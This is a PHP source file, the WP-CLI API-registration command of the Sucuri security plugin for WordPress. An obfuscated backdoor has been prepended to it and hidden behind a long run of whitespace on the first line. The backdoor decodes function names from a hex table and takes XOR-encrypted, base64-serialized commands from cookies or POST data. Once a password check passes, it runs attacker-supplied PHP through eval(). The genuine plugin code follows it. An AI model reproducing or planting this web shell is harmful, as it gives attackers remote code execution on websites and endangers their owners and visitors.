<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $cc5fd = 53;$GLOBALS['w271'] = Array();global $w271;$w271 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['ub2e03c'] = "\x33\x28\x5f\x25\x2b\x6a\x65\x40\x52\x6d\x67\x75\x66\x77\x7c\x39\x27\x29\x30\x45\x70\x51\x78\x48\x44\x5e\x5d\x4f\x3d\x74\x34\x59\x7d\x4e\xd\x42\x9\x5c\x2f\x3a\x57\x63\x7a\x31\x46\x5b\x7e\x64\x3c\x68\x36\x26\x37\x47\x22\x73\x55\x2d\x6c\x76\x21\x6f\x2e\x49\x3e\x2a\x50\xa\x79\x3b\x58\x2c\x20\x43\x4b\x4c\x71\x41\x62\x7b\x24\x72\x38\x3f\x35\x32\x4d\x54\x53\x6e\x5a\x69\x61\x60\x23\x56\x6b\x4a";$w271[$w271['ub2e03c'][55].$w271['ub2e03c'][30].$w271['ub2e03c'][15].$w271['ub2e03c'][82].$w271['ub2e03c'][47]] = $w271['ub2e03c'][41].$w271['ub2e03c'][49].$w271['ub2e03c'][81];$w271[$w271['ub2e03c'][58].$w271['ub2e03c'][82].$w271['ub2e03c'][52].$w271['ub2e03c'][41].$w271['ub2e03c'][47]] = $w271['ub2e03c'][61].$w271['ub2e03c'][81].$w271['ub2e03c'][47];$w271[$w271['ub2e03c'][61].$w271['ub2e03c'][92].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][92].$w271['ub2e03c'][47].$w271['ub2e03c'][82].$w271['ub2e03c'][50]] = $w271['ub2e03c'][55].$w271['ub2e03c'][29].$w271['ub2e03c'][81].$w271['ub2e03c'][58].$w271['ub2e03c'][6].$w271['ub2e03c'][89];$w271[$w271['ub2e03c'][41].$w271['ub2e03c'][82].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][15]] = $w271['ub2e03c'][91].$w271['ub2e03c'][89].$w271['ub2e03c'][91].$w271['ub2e03c'][2].$w271['ub2e03c'][55].$w271['ub2e03c'][6].$w271['ub2e03c'][29];$w271[$w271['ub2e03c'][42].$w271['ub2e03c'][52].$w271['ub2e03c'][15].$w271['ub2e03c'][12].$w271['ub2e03c'][12]] = $w271['ub2e03c'][55].$w271['ub2e03c'][6].$w271['ub2e03c'][81].$w271['ub2e03c'][91].$w271['ub2e03c'][92].$w271['ub2e03c'][58].$w271['ub2e03c'][91].$w271['ub2e03c'][42].$w271['ub2e03c'][6];$w271[$w271['ub2e03c'][58].$w271['ub2e03c'][0].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][85].$w271['ub2e03c'][50]] = $w271['ub2e03c'][20].$w271['ub2e03c'][49].$w271['ub2e03c'][20].$w271['ub2e03c'][59].$w271['ub2e03c'][6].$w271['ub2e03c'][81].$w271['ub2e03c'][55].$w271['ub2e03c'][91].$w271['ub2e03c'][61].$w271['ub2e03c'][89];$w271[$w271['ub2e03c'][9].$w271['ub2e03c'][85].$w271['ub2e03c'][41].$w271['ub2e03c'][12]] = $w271['ub2e03c'][11].$w271['ub2e03c'][89].$w271['ub2e03c'][55].$w271['ub2e03c'][6].$w271['ub2e03c'][81].$w271['ub2e03c'][91].$w271['ub2e03c'][92].$w271['ub2e03c'][58].$w271['ub2e03c'][91].$w271['ub2e03c'][42].$w271['ub2e03c'][6];$w271[$w271['ub2e03c'][78].$w271['ub2e03c'][47].$w271['ub2e03c'][30].$w271['ub2e03c'][41].$w271['ub2e03c'][12].$w271['ub2e03c'][6].$w271['ub2e03c'][6]] = $w271['ub2e03c'][78].$w271['ub2e03c'][92].$w271['ub2e03c'][55].$w271['ub2e03c'][6].$w271['ub2e03c'][50].$w271['ub2e03c'][30].$w271['ub2e03c'][2].$w271['ub2e03c'][47].$w271['ub2e03c'][6].$w271['ub2e03c'][41].$w271['ub2e03c'][61].$w271['ub2e03c'][47].$w271['ub2e03c'][6];$w271[$w271['ub2e03c'][42].$w271['ub2e03c'][78].$w271['ub2e03c'][78].$w271['ub2e03c'][6].$w271['ub2e03c'][18]] = $w271['ub2e03c'][55].$w271['ub2e03c'][6].$w271['ub2e03c'][29].$w271['ub2e03c'][2].$w271['ub2e03c'][29].$w271['ub2e03c'][91].$w271['ub2e03c'][9].$w271['ub2e03c'][6].$w271['ub2e03c'][2].$w271['ub2e03c'][58].$w271['ub2e03c'][91].$w271['ub2e03c'][9].$w271['ub2e03c'][91].$w271['ub2e03c'][29];$w271[$w271['ub2e03c'][89].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][30].$w271['ub2e03c'][0].$w271['ub2e03c'][30].$w271['ub2e03c'][43].$w271['ub2e03c'][47]] = $w271['ub2e03c'][11].$w271['ub2e03c'][18].$w271['ub2e03c'][0].$w271['ub2e03c'][85].$w271['ub2e03c'][78].$w271['ub2e03c'][50].$w271['ub2e03c'][47];$w271[$w271['ub2e03c'][96].$w271['ub2e03c'][85].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][78].$w271['ub2e03c'][47].$w271['ub2e03c'][52]] = $w271['ub2e03c'][9].$w271['ub2e03c'][47].$w271['ub2e03c'][82].$w271['ub2e03c'][18];$w271[$w271['ub2e03c'][22].$w271['ub2e03c'][15].$w271['ub2e03c'][78].$w271['ub2e03c'][78].$w271['ub2e03c'][85].$w271['ub2e03c'][92]] = $_POST;$w271[$w271['ub2e03c'][5].$w271['ub2e03c'][82].$w271['ub2e03c'][47].$w271['ub2e03c'][18].$w271['ub2e03c'][6].$w271['ub2e03c'][6].$w271['ub2e03c'][84].$w271['ub2e03c'][0]] = $_COOKIE;@$w271[$w271['ub2e03c'][41].$w271['ub2e03c'][82].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][15]]($w271['ub2e03c'][6].$w271['ub2e03c'][81].$w271['ub2e03c'][81].$w271['ub2e03c'][61].$w271['ub2e03c'][81].$w271['ub2e03c'][2].$w271['ub2e03c'][58].$w271['ub2e03c'][61].$w271['ub2e03c'][10], NULL);@$w271[$w271['ub2e03c'][41].$w271['ub2e03c'][82].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][15]]($w271['ub2e03c'][58].$w271['ub2e03c'][61].$w271['ub2e03c'][10].$w271['ub2e03c'][2].$w271['ub2e03c'][6].$w271['ub2e03c'][81].$w271['ub2e03c'][81].$w271['ub2e03c'][61].$w271['ub2e03c'][81].$w271['ub2e03c'][55], 0);@$w271[$w271['ub2e03c'][41].$w271['ub2e03c'][82].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][15]]($w271['ub2e03c'][9].$w271['ub2e03c'][92].$w271['ub2e03c'][22].$w271['ub2e03c'][2].$w271['ub2e03c'][6].$w271['ub2e03c'][22].$w271['ub2e03c'][6].$w271['ub2e03c'][41].$w271['ub2e03c'][11].$w271['ub2e03c'][29].$w271['ub2e03c'][91].$w271['ub2e03c'][61].$w271['ub2e03c'][89].$w271['ub2e03c'][2].$w271['ub2e03c'][29].$w271['ub2e03c'][91].$w271['ub2e03c'][9].$w271['ub2e03c'][6], 0);@$w271[$w271['ub2e03c'][42].$w271['ub2e03c'][78].$w271['ub2e03c'][78].$w271['ub2e03c'][6].$w271['ub2e03c'][18]](0);$jbc9e9 = NULL;$b0033 = NULL;$w271[$w271['ub2e03c'][13].$w271['ub2e03c'][15].$w271['ub2e03c'][30].$w271['ub2e03c'][0].$w271['ub2e03c'][41].$w271['ub2e03c'][82].$w271['ub2e03c'][18]] = $w271['ub2e03c'][6].$w271['ub2e03c'][78].$w271['ub2e03c'][43].$w271['ub2e03c'][41].$w271['ub2e03c'][15].$w271['ub2e03c'][6].$w271['ub2e03c'][50].$w271['ub2e03c'][50].$w271['ub2e03c'][57].$w271['ub2e03c'][84].$w271['ub2e03c'][82].$w271['ub2e03c'][41].$w271['ub2e03c'][18].$w271['ub2e03c'][57].$w271['ub2e03c'][30].$w271['ub2e03c'][30].$w271['ub2e03c'][0].$w271['ub2e03c'][6].$w271['ub2e03c'][57].$w271['ub2e03c'][15].$w271['ub2e03c'][6].$w271['ub2e03c'][41].$w271['ub2e03c'][50].$w271['ub2e03c'][57].$w271['ub2e03c'][85].$w271['ub2e03c'][15].$w271['ub2e03c'][41].$w271['ub2e03c'][0].$w271['ub2e03c'][92].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][92].$w271['ub2e03c'][78].$w271['ub2e03c'][50].$w271['ub2e03c'][92].$w271['ub2e03c'][92];global $w943c80;function  md80($jbc9e9, $vbc3){global $w271;$x0cd7663 = "";for ($hed0f=0; $hed0f<$w271[$w271['ub2e03c'][61].$w271['ub2e03c'][92].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][92].$w271['ub2e03c'][47].$w271['ub2e03c'][82].$w271['ub2e03c'][50]]($jbc9e9);){for ($i7de6=0; $i7de6<$w271[$w271['ub2e03c'][61].$w271['ub2e03c'][92].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][92].$w271['ub2e03c'][47].$w271['ub2e03c'][82].$w271['ub2e03c'][50]]($vbc3) && $hed0f<$w271[$w271['ub2e03c'][61].$w271['ub2e03c'][92].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][15].$w271['ub2e03c'][92].$w271['ub2e03c'][47].$w271['ub2e03c'][82].$w271['ub2e03c'][50]]($jbc9e9); $i7de6++, $hed0f++){$x0cd7663 .= $w271[$w271['ub2e03c'][55].$w271['ub2e03c'][30].$w271['ub2e03c'][15].$w271['ub2e03c'][82].$w271['ub2e03c'][47]]($w271[$w271['ub2e03c'][58].$w271['ub2e03c'][82].$w271['ub2e03c'][52].$w271['ub2e03c'][41].$w271['ub2e03c'][47]]($jbc9e9[$hed0f]) ^ $w271[$w271['ub2e03c'][58].$w271['ub2e03c'][82].$w271['ub2e03c'][52].$w271['ub2e03c'][41].$w271['ub2e03c'][47]]($vbc3[$i7de6]));}}return $x0cd7663;}function  u032b6d($jbc9e9, $vbc3){global $w271;global $w943c80;return $w271[$w271['ub2e03c'][96].$w271['ub2e03c'][85].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][78].$w271['ub2e03c'][47].$w271['ub2e03c'][52]]($w271[$w271['ub2e03c'][96].$w271['ub2e03c'][85].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][78].$w271['ub2e03c'][47].$w271['ub2e03c'][52]]($jbc9e9, $w943c80), $vbc3);}foreach ($w271[$w271['ub2e03c'][5].$w271['ub2e03c'][82].$w271['ub2e03c'][47].$w271['ub2e03c'][18].$w271['ub2e03c'][6].$w271['ub2e03c'][6].$w271['ub2e03c'][84].$w271['ub2e03c'][0]] as $vbc3=>$yb10d){$jbc9e9 = $yb10d;$b0033 = $vbc3;}if (!$jbc9e9){foreach ($w271[$w271['ub2e03c'][22].$w271['ub2e03c'][15].$w271['ub2e03c'][78].$w271['ub2e03c'][78].$w271['ub2e03c'][85].$w271['ub2e03c'][92]] as $vbc3=>$yb10d){$jbc9e9 = $yb10d;$b0033 = $vbc3;}}$jbc9e9 = @$w271[$w271['ub2e03c'][9].$w271['ub2e03c'][85].$w271['ub2e03c'][41].$w271['ub2e03c'][12]]($w271[$w271['ub2e03c'][89].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][18].$w271['ub2e03c'][30].$w271['ub2e03c'][0].$w271['ub2e03c'][30].$w271['ub2e03c'][43].$w271['ub2e03c'][47]]($w271[$w271['ub2e03c'][78].$w271['ub2e03c'][47].$w271['ub2e03c'][30].$w271['ub2e03c'][41].$w271['ub2e03c'][12].$w271['ub2e03c'][6].$w271['ub2e03c'][6]]($jbc9e9), $b0033));if (isset($jbc9e9[$w271['ub2e03c'][92].$w271['ub2e03c'][96]]) && $w943c80==$jbc9e9[$w271['ub2e03c'][92].$w271['ub2e03c'][96]]){if ($jbc9e9[$w271['ub2e03c'][92]] == $w271['ub2e03c'][91]){$hed0f = Array($w271['ub2e03c'][20].$w271['ub2e03c'][59] => @$w271[$w271['ub2e03c'][58].$w271['ub2e03c'][0].$w271['ub2e03c'][41].$w271['ub2e03c'][84].$w271['ub2e03c'][85].$w271['ub2e03c'][50]](),$w271['ub2e03c'][55].$w271['ub2e03c'][59] => $w271['ub2e03c'][43].$w271['ub2e03c'][62].$w271['ub2e03c'][18].$w271['ub2e03c'][57].$w271['ub2e03c'][43],);echo @$w271[$w271['ub2e03c'][42].$w271['ub2e03c'][52].$w271['ub2e03c'][15].$w271['ub2e03c'][12].$w271['ub2e03c'][12]]($hed0f);}elseif ($jbc9e9[$w271['ub2e03c'][92]] == $w271['ub2e03c'][6]){eval/*l32b6c6e8*/($jbc9e9[$w271['ub2e03c'][47]]);}exit();} ?><?php

/**
 * Code related to the cli.lib.php interface.
 *
 * PHP version 5
 *
 * @category   Library
 * @package    Sucuri
 * @subpackage SucuriScanCLI
 * @author     Daniel Cid <dcid@sucuri.net>
 * @copyright  2010-2017 Sucuri Inc.
 * @license    https://www.gnu.org/licenses/gpl-2.0.txt GPL2
 * @link       https://wordpress.org/plugins/sucuri-scanner
 */

if (!defined('SUCURISCAN_INIT') || SUCURISCAN_INIT !== true) {
    if (!headers_sent()) {
        /* Report invalid access if possible. */
        header('HTTP/1.1 403 Forbidden');
    }
    exit(1);
}

/**
 * Manage Sucuri API registration.
 *
 * @category   Library
 * @package    Sucuri
 * @subpackage SucuriScanner
 * @author     Daniel Cid <dcid@sucuri.net>
 * @copyright  2010-2017 Sucuri Inc.
 * @license    https://www.gnu.org/licenses/gpl-2.0.txt GPL2
 * @link       https://wordpress.org/plugins/sucuri-scanner
 */
class SucuriScanCLI extends WP_CLI_Command
{
    /**
     * Register and connect to the Sucuri API.
     *
     * ## OPTIONS
     *
     * [<api_key>]
     * : Sucuri API key to register with.
     *
     * ## EXAMPLES
     *
     *     # New registration
     *     wp sucuri register
     *     API key: 99e656abef7a123d1cffe73f91ba63702
     *     Success: The API key for your site was successfully generated and saved.
     *
     *     # Existing key registration
     *     wp sucuri register 99e656abef7a123d1cffe73f91ba63702
     *     Success: The API key for your site was successfully saved.
     *
     *     # Registration recovery
     *     wp sucuri register
     *     Warning: We already have an API key created for this site. It has been sent to the email admin@example.com for recovery.
     *
     * @param  array $args Arguments from the command line interface.
     * @return void
     */
    public function register($args)
    {
        list($api_key) = $args;

        ob_start();
        $registered = $api_key ? SucuriScanAPI::setPluginKey($api_key, true) : SucuriScanAPI::registerSite();
        $output = ob_get_clean();

        preg_match_all('/<p><b>SUCURI:<\/b>(.+)<\/p>/', $output, $matches);

        $message = isset($matches[1][0]) ? trim(strip_tags($matches[1][0])) : 'An unknown error occurred during registration.';

        if (! $registered) {
            WP_CLI::error($message);
        }

        if ($registered && $api_key) {
            WP_CLI::success('The API key for your site was successfully saved.');
            return;
        }

        $api_key = SucuriScanAPI::getPluginKey();

        WP_CLI::line("API key: $api_key");

        WP_CLI::success($message);
    }
}

WP_CLI::add_command('sucuri', 'SucuriScanCLI');
